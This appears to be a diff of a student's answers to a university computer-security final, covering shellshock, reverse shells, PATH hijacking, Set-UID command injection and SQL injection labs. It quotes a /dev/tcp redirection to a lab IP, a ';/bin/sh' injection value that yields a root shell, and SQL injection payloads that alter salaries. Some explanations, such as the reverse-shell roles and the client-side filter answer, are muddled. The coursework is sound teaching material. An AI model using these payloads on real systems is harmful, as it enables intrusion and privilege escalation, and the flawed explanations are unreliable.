@@ -22,6 +22,10 @@ _For the shellshock vulnerability to be exploitable, two conditions need to be s
 
 ### Task 1.3:
 
+_Suppose we run $ nc -l 7070 on Machine 1 (IP address is 10.0.2.6), and then we type the following command on Machine 2 (IP address is 10.0.2.7) $ /bin/cat < /dev/tcp/10.0.2.6/7070 >&0 Describe what is going to happen._
+
+- The first bash command opens a TCP listener at port 7070. The second bash command will run cat on the victim's machine (machine 1) via a TCP request and redirect the output to the attackers terminal (machine 1). This will create a reverse shell of the victim (Machine 1) so that the Attacker (Machine 2) can run commands on the victims compromised machine. 
+
 ### Task 1.4: 
 
 _What is ASLR and why does ASLR make buffer-overflow attacks more difficult?_
@@ -44,7 +48,7 @@ _What is the difference between reflected XSS and stored XSS?_
 
 _In the Diffie-Hellman key exchange, Alice sends g^x mod p to Bob, and Bob sends g^y mod p to Alice. How do they get a common secret?_
 
-- Alice would send hers to Bob and Bob would send his to Alice. Within the Diffie-Hellman key exchange it would recognize both as the same, resulting in the same secret key.
+- Alice sends g^x mod p to Bob and Bob sends g^y mod p to Alice. Alice then does (g^y mod p)^x mod p then Bob does (g^x mod p)^y mod p. From here both equations are the same, creating a common key. 
 
 ### Task 1.8:
 
@@ -56,11 +60,11 @@ _Why do we use hybrid encryption? Why don’t we simply use public key cryptogra
 
 _Part 1: When you run programs at the command line (e.g., ls, cat, top) or link to libraries (e.g., libc), how are these programs/libraries found?_
 
-- PLACEHOLDER
+- The linux environment variable PATH is used to search for programs/libraries in order.
 
 _Part 2: What is a potential risk of using this approach to find programs/libraries?_
 
-- PLACEHOLDER
+- An attacker could modify the PATH variable, for example, to run a malicious version of ls. This would involve placing the malicious ls programs location folder higher in the PATH variable so that it is found first. 
 
 ### Task 1.10:
 
@@ -109,9 +113,27 @@ _The objective of these tasks is to demonstrate my understanding of the Set-UID 
 
 ### Task 3.1:
 
+_Please read the source code for audit.c and, at a high level, describe what this program does and how it works._
+
+- This program takes a filename as input and attempts to run cat to display the files contents. This uses the system() function which makes this audit.c file vulnerable to exploitation. 
+
 ### Task 3.2:
 
+_With our understanding of audit.c from the previous task, please demonstrate how it can be exploited to run an arbitrary command with elevated privileges. For the demonstration, I need to compile audit.c and make the resulting executable a privileged Set-UID program._
+
+- I compiled the audit.c program and made it a root owned Set-UID program. Then I switched to user1 and created a text file that is writable to them only. By linking /bin/sh to /bin/zsh then running the executable with input “user1file.txt;/bin/sh” I got a root shell and was able to completely modify user1’s file. Exiting and switching to user1 showed the attack was successful.
+
+<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/task3-2.png>
+
 ### Task 3.3:
+
+_Suppose now that we want to fix the issue from the previous part. Now use audit2.c. This now uses execve() instead of system(). My task is to explain, and demonstrate, how the auditor can exploit audit2.c to do something they should not be able to do. For demonstration, I will need to compile audit2.c and make the resulting executable a privileged Set-UID program._
+
+- First I compiled audit2.c and sent it to a.out. I then checked permissions of a.out to verify that the user was root. I then checked the user1file.txt to verify that it was user1’s. I then viewed the file of user1file.txt. Running the executable on user1file.txt opens the file in more. I then used the !command feature to create a subshell as root. From here I was able to change the contents of user1file.txt to “THIS FILE SUCKS HAHAHAHAHA”. I then verified that the contents had been changed.
+
+<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/task3-3-1.png>
+<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/task3-3-2.png>
+
 
 ---
 
@@ -122,8 +144,26 @@ _Demonstrate my understanding of SQL Injection attacks._
 
 ### Task 4.1:
 
+_To defeat SQL injection attacks, a web application has implemented a filtering scheme on the client side: basically, on the page where users type their data, a filter is implemented using JavaScript. It removes any special character found in the data, such as apostrophes, characters for comments, and keywords reserved for SQL statements. Assume that filtering logic does it’s job, and can escape/remove all the code from the data._
+
+_Is this solution able to defeat SQL injection attacks? Explain._
+
+- No, because special characters can be translated into their encoded versions using % symbols bypassing the filter.
+
+
 ### Task 4.2:
+
+_The following SQL statement is sent to the database to add a new user to the database, where the content of the $name and $passwd variables are provided by the user, but the EID and Salary field are set by the system. How can a malicious employee set his/her salary to a value higher than 80000? Please demonstrate and explain your approach._
+
+-The user can create a password ending with a ‘,$SALARYVALUE to create a new password and set their own salary. For example by setting Bob’s password temp', 999999);# his password will be temp and his salary will be 999999
+
+<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/tak4-2.png>
 
 ### Task 4.3:
 
+_The following SQL statement is sent to the database, where $eid and $passwd contain data provided by the user. An attacker wants to try to get the database to run an arbitrary SQL statement. What should the attacker put inside $eid or $passwd to achieve that goal? Please demonstrate and explain your approach._
+
+- The user can manipulate the password field to terminate this SQL statement and append another SQL statement. For example, Bob could use the password ';UPDATE employee SET Salary=1 WHERE Name='Alice';# to run an UPDATE command that sets Alice’s salary to 1. 
+
+<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/task4-3.png>
 ---
